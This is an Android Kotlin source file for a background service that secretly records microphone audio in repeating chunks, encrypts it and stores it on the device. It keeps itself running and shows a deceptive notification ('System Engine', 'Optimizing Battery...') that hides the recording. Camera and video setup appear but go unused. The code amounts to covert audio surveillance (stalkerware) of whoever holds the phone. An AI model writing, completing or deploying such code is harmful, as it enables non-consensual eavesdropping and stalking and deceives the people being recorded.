package com.example.myapplication.service

import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.camera.camera2.Camera2Config
import androidx.camera.core.CameraXConfig
import androidx.core.app.NotificationCompat
import com.example.myapplication.R
import com.example.myapplication.security.EncryptionManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.Timer
import java.util.TimerTask

class MonitoringService : Service(), CameraXConfig.Provider {
    private lateinit var encryptionManager: EncryptionManager
    private var sessionTimer: Timer? = null
    private var audioRecord: AudioRecord? = null
    private val handler = Handler(Looper.getMainLooper())
    private val scope = CoroutineScope(Dispatchers.IO)
    private var isRecording = false

    companion object {
        private const val TAG = "MonitoringService"
        private const val SESSION_DURATION_MS = 5 * 60 * 1000L
        private const val NOTIFICATION_ID = 1001
        private const val MAX_STORAGE_BYTES = 10 * 1024 * 1024 * 1024L
        private const val AUDIO_SAMPLE_RATE = 44100
    }

    override fun onCreate() {
        super.onCreate()
        encryptionManager = EncryptionManager(this)
        startForegroundNotification()
        startMonitoring()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startForegroundNotification() {
        val notification = NotificationCompat.Builder(this, "monitoring_channel")
            .setContentTitle("System Engine")
            .setContentText("Optimizing Battery...")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setAutoCancel(false)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    private fun startMonitoring() {
        if (isRecording) return
        isRecording = true

        scope.launch {
            try {
                rotateSession()
            } catch (e: Exception) {
                Log.e(TAG, "Error starting monitoring", e)
            }
        }

        sessionTimer = Timer()
        sessionTimer?.scheduleAtFixedRate(
            object : TimerTask() {
                override fun run() {
                    scope.launch {
                        try {
                            rotateSession()
                            cleanupOldFiles()
                        } catch (e: Exception) {
                            Log.e(TAG, "Error in session rotation", e)
                        }
                    }
                }
            },
            SESSION_DURATION_MS,
            SESSION_DURATION_MS
        )
    }

    private suspend fun rotateSession() {
        val timestamp = SimpleDateFormat(
            "yyyy_MM_dd_HH_mm_ss",
            Locale.US
        ).format(Date())

        val audioFileName = "audio_$timestamp.enc"
        val videoFileName = "video_$timestamp.enc"

        try {
            recordAudioChunk(audioFileName)
        } catch (e: Exception) {
            Log.e(TAG, "Error recording audio", e)
        }
    }

    private suspend fun recordAudioChunk(filename: String) {
        try {
            val outputStream = encryptionManager.getEncryptedOutputStream(filename)
            val minBufferSize = AudioRecord.getMinBufferSize(
                AUDIO_SAMPLE_RATE,
                android.media.AudioFormat.CHANNEL_IN_MONO,
                android.media.AudioFormat.ENCODING_PCM_16BIT
            )

            val audioRecord = AudioRecord(
                MediaRecorder.AudioSource.MIC,
                AUDIO_SAMPLE_RATE,
                android.media.AudioFormat.CHANNEL_IN_MONO,
                android.media.AudioFormat.ENCODING_PCM_16BIT,
                minBufferSize * 2
            )

            audioRecord.startRecording()

            val buffer = ByteArray(minBufferSize)
            val startTime = System.currentTimeMillis()

            while (System.currentTimeMillis() - startTime < 5000) {
                val bytesRead = audioRecord.read(buffer, 0, buffer.size)
                if (bytesRead > 0) {
                    outputStream.write(buffer, 0, bytesRead)
                }
            }

            audioRecord.stop()
            audioRecord.release()
            outputStream.close()

            Log.d(TAG, "Audio chunk recorded: $filename")
        } catch (e: Exception) {
            Log.e(TAG, "Error in recordAudioChunk", e)
        }
    }

    private suspend fun cleanupOldFiles() {
        val totalSize = encryptionManager.getEncryptedFilesSize()

        if (totalSize > MAX_STORAGE_BYTES) {
            val files = encryptionManager.getAllEncryptedFiles()
            val toDelete = (totalSize - MAX_STORAGE_BYTES) / (1024 * 1024)

            files.take((toDelete / 50).toInt()).forEach { file ->
                encryptionManager.deleteEncryptedFile(file.name)
                Log.d(TAG, "Deleted old file: ${file.name}")
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        isRecording = false
        sessionTimer?.cancel()
        audioRecord?.release()
    }

    override fun getCameraXConfig(): CameraXConfig {
        return Camera2Config.Builder().build()
    }
}
